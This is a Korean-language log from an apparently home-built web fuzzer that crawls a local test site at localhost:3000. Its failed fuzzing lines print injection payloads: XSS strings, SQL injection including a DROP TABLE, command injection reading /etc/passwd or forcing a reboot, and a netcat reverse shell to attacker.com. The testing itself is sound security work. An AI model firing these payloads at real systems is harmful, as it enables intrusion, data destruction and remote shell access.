2024-10-30 20:32:57,457 - ERROR - robots.txt 접근 실패 - 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: /robots.txt (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x105393740>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:32:57,457 - INFO - [StaticCrawler] 방문 중: http://www.localhost:3000/
2024-10-30 20:32:57,458 - ERROR - [StaticCrawler] 요청 실패 - URL: http://www.localhost:3000/, 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x105393ef0>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:32:57,458 - INFO - [StaticCrawler] 크롤링 완료: 0개의 URL 수집.
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,461 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: ''; DROP TABLE users; --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,462 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '; ls', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<iframe src='javascript:alert("XSS")'></iframe>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,463 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/register, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:06,485 - INFO - NanumGothic font registered successfully.
2024-10-30 20:33:06,512 - INFO - NanumGothic 폰트 등록 성공
2024-10-30 20:33:06,604 - INFO - [PDFReport] 리포트가 fuzzer_report.pdf에 생성되었습니다.
2024-10-30 20:33:06,604 - INFO - [Main] 웹 퍼징이 완료되었습니다.
2024-10-30 20:33:48,389 - ERROR - robots.txt 접근 실패 - 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: /robots.txt (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x107f47a40>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:33:48,389 - INFO - [StaticCrawler] 방문 중: http://www.localhost:3000/
2024-10-30 20:33:48,391 - ERROR - [StaticCrawler] 요청 실패 - URL: http://www.localhost:3000/, 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x107f84200>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:33:48,391 - INFO - [StaticCrawler] 크롤링 완료: 0개의 URL 수집.
2024-10-30 20:33:49,307 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/, 깊이: 0
2024-10-30 20:33:49,422 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:49,434 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/products, 깊이: 1
2024-10-30 20:33:49,467 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/products
2024-10-30 20:33:49,503 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 1
2024-10-30 20:33:49,523 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:49,534 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/posts, 깊이: 1
2024-10-30 20:33:49,559 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/posts
2024-10-30 20:33:49,596 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/login, 깊이: 1
2024-10-30 20:33:49,616 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/login
2024-10-30 20:33:49,627 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/products/add, 깊이: 2
2024-10-30 20:33:49,649 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/products/add
2024-10-30 20:33:49,660 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/4, 깊이: 2
2024-10-30 20:33:49,681 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/4
2024-10-30 20:33:49,691 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/14, 깊이: 2
2024-10-30 20:33:49,713 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/14
2024-10-30 20:33:49,723 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/products?page=1, 깊이: 2
2024-10-30 20:33:49,747 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/products?page=1
2024-10-30 20:33:49,782 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/5, 깊이: 2
2024-10-30 20:33:49,805 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/5
2024-10-30 20:33:49,815 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/products?page=2, 깊이: 2
2024-10-30 20:33:49,842 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/products?page=2
2024-10-30 20:33:49,886 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/11, 깊이: 2
2024-10-30 20:33:49,907 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/11
2024-10-30 20:33:49,918 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/2, 깊이: 2
2024-10-30 20:33:49,938 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/2
2024-10-30 20:33:49,948 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/8, 깊이: 2
2024-10-30 20:33:49,974 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/8
2024-10-30 20:33:49,984 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/15, 깊이: 2
2024-10-30 20:33:50,003 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/15
2024-10-30 20:33:50,013 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/1, 깊이: 2
2024-10-30 20:33:50,033 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/1
2024-10-30 20:33:50,045 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/6, 깊이: 2
2024-10-30 20:33:50,065 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/6
2024-10-30 20:33:50,077 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/12, 깊이: 2
2024-10-30 20:33:50,099 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/12
2024-10-30 20:33:50,111 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/3, 깊이: 2
2024-10-30 20:33:50,132 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/3
2024-10-30 20:33:50,144 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/10, 깊이: 2
2024-10-30 20:33:50,164 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/10
2024-10-30 20:33:50,176 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/7, 깊이: 2
2024-10-30 20:33:50,196 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/7
2024-10-30 20:33:50,208 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 2
2024-10-30 20:33:50,227 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:50,237 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/9, 깊이: 2
2024-10-30 20:33:50,258 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/9
2024-10-30 20:33:50,271 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/productDetail/13, 깊이: 2
2024-10-30 20:33:50,291 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/productDetail/13
2024-10-30 20:33:50,302 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 2
2024-10-30 20:33:50,323 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:50,333 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/posts?page=2, 깊이: 2
2024-10-30 20:33:50,357 - INFO - [DynamicCrawler] 발견된 폼: 1개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/posts?page=2
2024-10-30 20:33:50,390 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/postDetail/2, 깊이: 2
2024-10-30 20:33:50,412 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/postDetail/2
2024-10-30 20:33:50,424 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/postDetail/5, 깊이: 2
2024-10-30 20:33:50,443 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/postDetail/5
2024-10-30 20:33:50,453 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000/postDetail/13, 깊이: 2
2024-10-30 20:33:50,475 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/postDetail/13
